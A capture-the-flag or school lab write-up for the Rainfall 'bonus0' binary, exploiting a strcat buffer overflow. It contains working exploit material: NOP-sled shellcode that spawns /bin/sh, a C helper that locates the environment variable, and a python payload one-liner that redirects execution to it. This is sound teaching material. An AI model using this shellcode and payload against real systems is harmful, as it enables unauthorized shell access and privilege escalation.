# Bonus0

Let's see to the binary

![](/Users/a19523132/school/Rainfall/bonus0/Ressources/img/bonus0_launch.png)

Seem, this program waits two strings as input and prints them. Let's use [gdb](Ressources/gdb.md) to understand what's going on. 

We can see that this program is using `strcat` known for its overflow overruns.

For this exploit, we need:

1. Tinkering a [Shellcode](https://en.wikipedia.org/wiki/Shellcode) and get its address 
2. Find the offset of one buffer to inject it = 9 bytes

> It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, 
> but any piece of code that performs a similar task can be called shellcode.

Let's get the shellcode from [this article](https://0xrick.github.io/binary-exploitation/bof5/)

export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`

Using a lot of `NOP` instructions before the Shellcode helps us to consistently find it even if the environment address shifts 
a bit as `NOP` instruction will only indicate to go to the next one until we find the first "real" instruction.

Then, we'll need to find where this environment variable is stored in memory. For that we can use:

    #include <cstdio>
    #include <cstdlib>
    
    int main(int ac, char** av)
    {
        printf("env address at %p\n", getenv(av[1]));
        return (0);
    }

Using this program with SHELLCODE as parameter will output where this environment variable is stored in memory

Now all we have to do is filling up the first buffer with `4096` bytes, shift `9` bytes into the second one, 
input the address of the Shellcode and fill the remaining space with junk (`7` bytes) to get a shell

`(python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\xXX\xXX\xXX\xXX'[::-1] + '\x90' * 7"; cat) | ./bonus0`

![](/Users/a19523132/school/Rainfall/bonus0/Ressources/img/bonus1.png)
